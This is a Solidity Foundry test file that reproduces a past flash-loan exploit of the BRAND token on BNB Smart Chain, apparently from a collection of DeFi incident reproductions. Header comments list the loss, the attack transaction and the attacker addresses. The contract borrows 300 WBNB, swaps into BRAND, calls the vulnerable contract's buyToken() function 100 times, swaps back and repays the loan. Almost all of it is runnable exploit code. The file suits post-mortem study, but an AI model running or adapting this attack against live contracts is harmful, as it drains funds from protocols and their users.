pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~23 WBNB
// TX : https://app.blocksec.com/explorer/tx/bsc/0x19ef4febcd272643642925d5d7e9ab8fd3ed8785c5e3268f5b6fee44ae6b4a34
// Attacker : https://bscscan.com/address/0x835b45d38cbdccf99e609436ff38e31ac05bc502
// Attack Contract : https://bscscan.com/address/0xf994f331409327425098feecfc15db7fabf782b7
// GUY : https://x.com/MetaSec_xyz/status/1720035913009709473


contract Exploit is Test{
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakePair Pair = IPancakePair(0x88fF4f62A75733C0f5afe58672121568a680DE84);
    IERC20 BRAND = IERC20(0x4d993ec7b44276615bB2F6F20361AB34FbF0ec49);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IDPPOracle private constant DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    address Vulncontract=0x831d6F9AA6AF85CeAD4ccEc9B859c64421EEeFD4;

    function setUp() external {
        cheats.createSelectFork("bsc", 33139124);
    }

       function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker WBNB before exploit", WBNB.balanceOf(address(this)), 18);
        DPP.flashLoan(300 ether, 0, address(this), abi.encode(3));
        emit log_named_decimal_uint("[End] Attacker WBNB after exploit", WBNB.balanceOf(address(this)), 18);
   

    }
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        swap_token_to_token(address(WBNB), address(BRAND), 300 ether);
        uint256 i=0;
        while(i<100){
            address(Vulncontract).call(abi.encodeWithSignature("buyToken()"));
            i++;
        }
        swap_token_to_token(address(BRAND), address(WBNB), BRAND.balanceOf(address(this)));
        WBNB.transfer(msg.sender,baseAmount);
    }
    function swap_token_to_token(address a,address b,uint256 amount) internal {
        IERC20(a).approve(address(Router), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }
}
